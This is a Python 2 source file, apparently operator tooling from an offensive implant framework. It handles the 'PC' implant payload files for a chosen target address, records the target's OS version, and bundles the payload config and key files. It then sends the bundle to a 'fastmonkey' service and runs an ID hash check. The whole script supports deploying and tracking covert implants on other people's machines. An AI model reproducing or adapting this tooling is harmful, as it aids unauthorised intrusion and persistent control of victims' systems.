
from __future__ import print_function
from globalconfig import config
import datetime
import dsz, dsz.script
import hashlib
import ops, ops.env, ops.cmd, ops.menu, ops.project, ops.system.systemversion
import os, sys
import os.path
import time
import shutil
import sendfile
from ConfigParser import SafeConfigParser
from argparse import ArgumentParser
if (__name__ == '__main__'):
    parser = ArgumentParser(prog='copypc', description='Copies PC L4 payload files via fastmonkey')
    parser.add_argument(dest='payDir', metavar='payload_folder', nargs='?', default=os.path.join(config['paths']['tmp'], 'payload'), help='Payload folder to read and copy files from.')
    parser.add_argument('-u', '--userID', dest='userID', help='Your user ID. You will be prompted if ID is not known and not given.', default=ops.env.get('OPS_USERID', addr=''))
    parser.add_argument('-p', '--project', dest='project', default=None, help='Project. Defaults to current DSZ LP project if not specified.')
    parser.add_argument('-v', '--verbose', dest='verbose', default=False, action='store_true', help='Print verbose information about the copying process.')
    parser.add_argument('--insane', dest='insane', action='store_true', default=False, help='Indicate the you are insane (disables PC ID sanity hash prompt loop).')
    parser.add_argument('-d', '--directory', dest='oldPayDir', help='(Deprecated) Payload folder to read and copy files from. Provided for backwards compatibility support only.')
    parser.add_argument('-x', '--norename', dest='rename', action='store_false', default=True, help='Disables rename of the payload directory to <name>.sent after sending data.')
    options = parser.parse_args()
    if (options.userID is None):
        options.userID = dsz.ui.GetString('Enter your user ID: ')
        ops.env.set('OPS_USERID', options.userID, addr='')
        if options.verbose:
            ops.info('User ID cached in LP environment OPS_USERID.')
    else:
        oldid = ops.env.get('OPS_USERID', addr='')
        ops.env.set('OPS_USERID', options.userID, addr='')
        if (oldid is None):
            ops.info('User ID cached in LP environment OPS_USERID.')
        elif (oldid != options.userID):
            ops.info('Updated cached user ID in LP environment OPS_USERID.')
    if options.oldPayDir:
        options.payDir = options.oldPayDir
    installers = (((ops.cmd.get_filtered_command_list(isrunning=True, goodwords=['pc_install']) + ops.cmd.get_filtered_command_list(isrunning=True, goodwords=['pc2.2_install'])) + ops.cmd.get_filtered_command_list(isrunning=True, goodwords=['pc_upgrade'])) + ops.cmd.get_filtered_command_list(isrunning=True, goodwords=['pc2.2_upgrade']))
    cpaddrs = []
    for i in installers:
        cpaddrs.append(dsz.cmd.data.Get('commandmetadata::destination', dsz.TYPE_STRING, i)[0])
    if (len(cpaddrs) != 1):
        ops.warn('Could not determine target CP address for OS information because there are multiple installers running.')
        ops.warn('Please select a target:')
        menu = ops.menu.Menu()
        menu.add_option('Manual CP entry')
        for i in cpaddrs:
            menu.add_option(i, section='pc_install/upgrade detected')
        result = menu.execute(menuloop=False)
        if (result['selection'] == 1):
            cpaddr = dsz.ui.GetString('Enter CP address')
        elif (result['selection'] == 0):
            print('Aborted.')
            sys.exit((-1))
        else:
            cpaddr = result['option']
    elif (len(cpaddrs) < 1):
        pass
    else:
        cpaddr = cpaddrs[0]
    if (options.project is None):
        options.project = ops.env.get('OPS_PROJECTNAME', addr=cpaddr)
        if (options.project is None):
            options.project = ops.PROJECT
    dataDir = os.path.join(options.payDir, 'data')
    gmtStamp = time.strftime('%Y-%m-%d-[%H-%M-%S]')
    randDir = os.path.join(config['paths']['tmp'], ((options.project + '-') + gmtStamp))
    os.makedirs(randDir)
    if options.verbose:
        ops.info(("Created random directory '%s'" % randDir))
    systemversion = ops.system.systemversion.get_os_version(targetID=ops.project.getTargetID(cpaddr), maxage=datetime.timedelta.max)
    osver = SafeConfigParser()
    osver.add_section('OsVersionInfo')
    osver.set('OsVersionInfo', 'Platform', systemversion.versioninfo.friendlyplatform)
    osver.set('OsVersionInfo', 'ServicePack', systemversion.versioninfo.extrainfo)
    with open(os.path.join(randDir, 'pcid-osversioninfo.txt'), 'w') as output:
        osver.write(output)
    shutil.copy(os.path.join(dataDir, 'config.xml'), randDir)
    shutil.copy(os.path.join(dataDir, 'exec.properties'), randDir)
    shutil.copy(os.path.join(dataDir, 'public_key.bin'), randDir)
    shutil.copy(os.path.join(dataDir, 'private_key.bin'), randDir)
    tempzipname = ('%s-%s-%s-PCID.zip' % (options.userID, options.project, gmtStamp))
    try:
        sendfile.main(randDir, outfilename=tempzipname)
    except:
        print()
        ops.error('It looks like you failed to FTP... sad.')
    pcversion = '<unknown>'
    with open(os.path.join(dataDir, 'exec.properties'), 'r') as input:
        for line in input:
            property = line.strip().split(':')
            if ((len(property) == 2) and (property[0] == 'version')):
                pcversion = property[1]
                break
    if options.rename:
        renamed = ('%s.sent-%s' % (options.payDir, gmtStamp))
        os.rename(options.payDir, renamed)
        if options.verbose:
            ops.info(("Renamed payload directory to '%s'" % renamed))
    print()
    dsz.ui.Echo('------------------------------------------------------------', dsz.WARNING)
    print(('User ID                   : %s' % options.userID))
    print(('Project                   : %s' % options.project))
    print(('PC Version                : %s' % pcversion))
    print(('OS Platform               : %s' % systemversion.versioninfo.friendlyplatform))
    print(('OS Service Pack           : %s' % systemversion.versioninfo.extrainfo))
    print(('Payload time stamp        : %s' % gmtStamp))
    print(('Payload sent to fastmonkey: %s' % tempzipname))
    print(('Pastable if you need to re-send:\n    copyfast -i %s -o %s' % (randDir, tempzipname)))
    dsz.ui.Echo('------------------------------------------------------------', dsz.WARNING)
    print('\nVerify that the payload you process matches the information you just sent.\n')
    if (not options.insane):
        while True:
            pcid = hex(dsz.ui.GetInt('Enter your PC ID from FC'))
            if pcid.upper().endswith('L'):
                pcid = pcid[:(-1)]
            print(('\nMD5: %s\n' % hashlib.md5(pcid).hexdigest()))
            if dsz.ui.Prompt('Is this correct?', False):
                dsz.ui.Echo('You are sane! Congratulations!', dsz.GOOD)
                break